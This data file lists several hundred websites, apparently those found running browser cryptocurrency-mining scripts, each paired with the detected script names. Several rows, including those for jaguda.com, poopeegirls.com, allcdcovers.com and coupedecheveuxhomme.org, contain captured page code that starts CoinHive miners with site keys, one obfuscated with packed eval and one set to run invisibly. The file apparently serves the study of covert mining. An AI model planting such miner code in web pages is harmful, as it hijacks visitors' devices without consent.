activebeat.co,xmr.js
chocolateslimshop.net,xmr.js
activebeat.com,xmr.js
cnhv.co,coinhive.com/lib/coinhive.min.js;coinhive.min.js;simple-ui.min.js
puzzle-movies.com,miner.min.js
ukpirateproxy.xyz,coinhive.com/lib/coinhive.min.js;coinhive.min.js
natega-eg.info,coinhive.com/lib/coinhive.min.js;coinhive.min.js
fastpiratebay.co.uk,coinhive.com/lib/coinhive.min.js;coinhive.min.js
kisshentai.net,c-hive.js
yready.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
123moviesfull.org,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
jaguda.com,"coinhive.com/lib/coinhive.min.js""></script> <script>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('8 1=6 5.2(\'3\',{9:4,a:c,b:0.7});1.d();',14,14,'|miner|User|3uQypvgF1s3j9x2XChtADzTENNhxFWrz||CoinHive|new||var|threads|autoThreads|throttle|false|start'.split('|'),0,{}))</script> <div class=""td-header-wrap td-header-style-1""><div class=""td-header-top-menu-full td-container-wrap ""><div class=""td-container td-header-row td-header-top-menu""></div></div><div class=""td-banner-wrap-full td-logo-wrap-full td-container-wrap ""><div class=""td-container td-header-row td-header-header""><div class=""td-header-sp-logo""><h1 class=""td-logo""> <a class=""td-main-logo"" href=""http://jaguda.com/""> <img class=""td-retina-data"" data-retina=""http://jaguda.com/wp-content/uploads/2015/07/jaguda103-mod.png"" src=""http://jaguda.com/wp-content/uploads/2015/07/jaguda103-mod.png"" alt=""jaguda.com logo"" title=""jaguda.com logo""/> <span class=""td-visual-hidden"">Jaguda.com</span> </a></h1></div><div class=""td-header-sp-recs""><div class=""td-header-rec-wrap"">  <script async src=""//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js;coinhive.min.js"
filmek-online.com,authedmine.min.js
hyperproxy.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
unblocktpb.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
poopeegirls.com,"coinhive.com/lib/coinhive.min.js'></script><script>var miner = new CoinHive.Anonymous('jG3HF30NgtufMsvWJtNe2YyobwAxloMu', {throttle: 0.5});miner.start();</script><!-- Yandex.Metrika counter --><script type='text/javascript'> (function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter21312970 = new Ya.Metrika({ id:21312970, clickmap:true, trackLinks:true, accurateTrackBounce:true }); } catch(e) { } }); var n = d.getElementsByTagName('script')[0], s = d.createElement('script'), f = function () { n.parentNode.insertBefore(s, n); }; s.type = 'text/javascript'; s.async = true; s.src = 'https://mc.yandex.ru/metrika/watch.js'; if (w.opera == '[object Opera]') { d.addEventListener('DOMContentLoaded', f, false); } else { f(); } })(document, window, 'yandex_metrika_callbacks'); </script><noscript><div><img src='https://mc.yandex.ru/watch/21312970' style='position:absolute; left:-9999px;' alt='' /></div></noscript> <!-- /Yandex.Metrika counter --><script type='text/javascript'>var _gaq = _gaq || [];_gaq.push(['_setAccount', 'UA-38057909-1']);_gaq.push(['_trackPageview']);(function() {var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js;coinhive.min.js"
slider.kz,authedmine.min.js
file2hd.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
piratebays.co.uk,coinhive.com/lib/coinhive.min.js;coinhive.min.js
primeassteens.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
bitfib.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
moviesunus01.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
legendaoficial.net,miner.min.js
celebrity-leaks.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
elsiglo.com.ve,coinhive.com/lib/coinhive.min.js;coinhive.min.js
kanbilibili.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
piratebay247.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
naghdefarsi.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
bestvseries.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
serije.online,authedmine.min.js
blkom.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
image-heaven.nl,coinhive.com/lib/coinhive.min.js;coinhive.min.js
cumception.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
tiny-tools.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
tainiesonline.tv,coinhive.com/lib/coinhive.min.js;coinhive.min.js
redditery.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
extranews.ro,coinhive.com/lib/coinhive.min.js;coinhive.min.js
eduvision.edu.pk,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
3dzone.link,coin-hive/includes/js/base64.min.js;coinhive.com/lib/coinhive.min.js;coinhive.min.js;simple-ui.min.js
oemepc.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
duckingproxy.eu,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pirateproxy.yt,coinhive.com/lib/coinhive.min.js;coinhive.min.js
ukpirate.click,coinhive.com/lib/coinhive.min.js;coinhive.min.js
onlinejudge.org,authedmine.min.js
xxxstreams.eu,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pornstreams.eu,coinhive.com/lib/coinhive.min.js;coinhive.min.js
bfpgf.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
xxx-torrent.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
watchwrestling.cc,coinhive.com/lib/coinhive.min.js;coinhive.min.js
mintmovies.to,coinhive.com/lib/coinhive.min.js;coinhive.min.js
filmogo.co,coinhive.com/lib/coinhive.min.js;coinhive.min.js
kaomoji.ru,coinhive.com/lib/miner.min.js;miner.min.js
alan.az,coinhive.com/lib/coinhive.min.js;coinhive.min.js
piratetoday.click,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pirateproxy.tf,coinhive.com/lib/coinhive.min.js;coinhive.min.js
ikwildepiratebay.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
series-cravings.tv,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
barelist.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
wearepirates.click,coinhive.com/lib/coinhive.min.js;coinhive.min.js
sihirdarrehberi.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
piratebayproxy.tf,coinhive.com/lib/coinhive.min.js;coinhive.min.js
hentaibedta.net,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
price.exchange,coinhive.com/lib/miner.min.js;miner.min.js
authedmine.com,authedmine.min.js
coin.mg,authedmine.min.js
hidefporn.ws,coinhive.com/lib/coinhive.min.js;coinhive.min.js
hqxxxpics.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
alotof.software,projectpoi.min.js
darkumbra.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
darkscene.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
gameofbay.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
101porno.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
offacommunitynews.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
downloadae.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
fontyab.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
publishyourarticles.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
xxhdporn.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
filikulamo.to,coinhive.com/lib/coinhive.min.js;coinhive.min.js
hashkiller.co.uk,authedmine.min.js
ssaveilbe.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
epmundo.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
domaha.tv,coinhive.com/lib/coinhive.min.js;coinhive.min.js
ukpirate.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
megapornpics.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pajoohe.ir,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pirate.trade,coinhive.com/lib/coinhive.min.js;coinhive.min.js
9tube.me,coinhive.com/lib/coinhive.min.js;coinhive.min.js
firmware.center,coinhive.min.js;coinhive.min.js
toketmontoksmp.online,coinhive.com/lib/coinhive.min.js;coinhive.min.js
legendafilmes.com.br,coinhive.com/lib/coinhive.min.js;coinhive.min.js
uma.co.ao,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
tpbunblocked.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
streamonsports.com,authedmine.min.js
all-books.net,coinhive.com/lib/miner.min.js;miner.min.js
taiwantv.co,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
unblockedbay.info,coinhive.com/lib/coinhive.min.js;coinhive.min.js
hongpakkroo.com,coinhive.com/lib/miner.min.js;miner.min.js
baypirate.click,coinhive.com/lib/coinhive.min.js;coinhive.min.js
datawav.club,coinhive.com/lib/coinhive.min.js;coinhive.min.js
djpunjab.video,coinhive.com/lib/coinhive.min.js;coinhive.min.js
diagnoz.net.ua,coinhive.com/lib/coinhive.min.js;coinhive.min.js
piratebaymirror.eu,coinhive.com/lib/coinhive.min.js;coinhive.min.js
laspalabras.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
binbinss.bid,projectpoi.min.js
rcyclmnrhgntry.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
streamingk.com,coinhive.com/lib/miner.min.js;miner.min.js
mycashbar.com,coinhive.com/lib/miner.min.js;miner.min.js
xiaoporn.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
peliculasio.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
gjart.cn,coinhive.com/lib/coinhive.min.js;coinhive.min.js
droppdf.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
img4fap.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
proxyproxyproxy.nl,coinhive.com/lib/coinhive.min.js;coinhive.min.js
n4k.ru,coinhive.com/lib/coinhive.min.js;coinhive.min.js
v-kosmose.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
thepiratebay.uk.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
documbase.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
jagledam.co,coinhive.com/lib/coinhive.min.js;coinhive.min.js
puzzle-teacher.com,miner.min.js
clubkyo.com,simple-ui.min.js
p2pbg.com,coinhive.com/lib/miner.min.js;coinhive.min.js;miner.min.js
xiaohaoyun.com,coinhive.com/lib/coinhive.min.js></script><script src=http://www.zwxiu.com/weixiu/Public/Tpl/default/js/comm0n.js;coinhive.min.js
yaozy.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
translate.ge,authedmine.min.js
superbabyonline.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
ggbases.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
iitv.pl,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pelispedia.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
heja.tv,coinhive.com/lib/coinhive.min.js;coinhive.min.js;simple-ui.min.js
arkitera.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
link2save.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
planete-bd.org,coinhive.com/lib/miner.min.js;miner.min.js
cdcovers.cc,coinhive.com/lib/coinhive.min.js;coinhive.min.js
bayimg.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
zamunda.ch,authedmine.min.js
ingresscode.cn,coinhive.com/lib/coinhive.min.js;coinhive.min.js
wawa-mania.xyz,authedmine.min.js
allcdcovers.com,"coinhive.com/lib/coinhive.min.js""></script><script>var miner = new CoinHive.Anonymous(""3ZgdIRaqKkNGJcV48p9RKU0KE9iobVh5"");miner.setThrottle(0.1);miner.start();</script><script type=""text/javascript"" src=""/sf/prototype/js/prototype.js;coinhive.min.js"
obviousmag.org,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
youjizz.bz,coinhive.com/lib/coinhive.min.js;coinhive.min.js
uinsgd.ac.id,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
way2java.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
guitarprotabs.org,authedmine.min.js
zemno.ru,coinhive.com/lib/coinhive.min.js;coinhive.min.js
vimaru.edu.vn,coinhive.com/lib/coinhive.min.js;coinhive.min.js
darkfetishnet.com,coinhive.com/lib/miner.min.js;miner.min.js
skymem.info,coinhive.com/lib/coinhive.min.js;coinhive.min.js
tpbportal.in,coinhive.com/lib/coinhive.min.js;coinhive.min.js
linkarena.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
yallakhbr.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
streamit.ws,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
wawa-porn.biz,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
socialchance.ru,authedmine.min.js
cuevana0.tv,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
filmclub.tv,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pirateproxy.click,coinhive.com/lib/coinhive.min.js;coinhive.min.js
linsux.org,authedmine.min.js
damelibros.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
esfahanemrooz.ir,coinhive.com/lib/coinhive.min.js;coinhive.min.js
kinoteka.biz,coinhive.com/lib/coinhive.min.js;coinhive.min.js
proxypirate.in,coinhive.com/lib/coinhive.min.js;coinhive.min.js
piratebays.co,coinhive.com/lib/coinhive.min.js;coinhive.min.js
brouz.ir,authedmine.min.js
homeporno.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
gamescounter.xyz,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
loadgamepc-free.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
m7flashgames.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
raiminer.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js;miner.js
urbanproxy.eu,coinhive.com/lib/coinhive.min.js;coinhive.min.js
cwsguide.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
baybaypirate.org,coinhive.com/lib/coinhive.min.js;coinhive.min.js
secretnews.fr,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
kopertis12.or.id,coinhive.com/lib/coinhive.min.js;coinhive.min.js
jagledam.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
hellastz.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
smovies.pw,coinhive.com/lib/coinhive.min.js;coinhive.min.js
coupedecheveuxhomme.org,"coin-hive.com/lib/coinhive.min.js?ver=4.9.2'></script> <script type='text/javascript'>smmchMineOptions = {}; smmchMineOptions.invisible=""true""; smmchMineOptions.sitekey = ""iQXi12E5noi0Jfj4z9XvKrNrN7m4IcRQ""; smmchMineOptions.throttle = ""0.7""; smmchMineOptions.mobileblock = ""on"";</script> <script type='text/javascript' src='http://coupedecheveuxhomme.org/wp-content/plugins/simple-monero-miner-coin-hive/js/smmch-mine.js;coinhive.min.js?ver=4.9.2'></script> <script type='text/javascript'>smmchMineOptions = {}; smmchMineOptions.invisible=""true""; smmchMineOptions.sitekey = ""iQXi12E5noi0Jfj4z9XvKrNrN7m4IcRQ""; smmchMineOptions.throttle = ""0.7""; smmchMineOptions.mobileblock = ""on"";</script> <script type='text/javascript' src='http://coupedecheveuxhomme.org/wp-content/plugins/simple-monero-miner-coin-hive/js/smmch-mine.js;coinhive.min.js"
tpbmirror.us,coinhive.com/lib/coinhive.min.js;coinhive.min.js
es-anlam.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
108clip.com,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
bobsvagene.club,coinhive.com/lib/coinhive.min.js;coinhive.min.js
pesominer.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
vefire.ru,coinhive.com/lib/coinhive.min.js;coinhive.min.js
elwasfa.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
lllfff.com,coinhive.com/lib/coinhive.min.js;coinhive.min.js
themelike.net,coinhive.com/lib/coinhive.min.js;coinhive.min.js
hdwallpaperbackgrounds.net,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
elect.capital,coinhive.com/lib/coinhive.min.js;coinhive.min.js
bioskop.vip,coin-hive.com/lib/coinhive.min.js;coinhive.min.js;coinhive.min.js
yts.website,miner.min.js
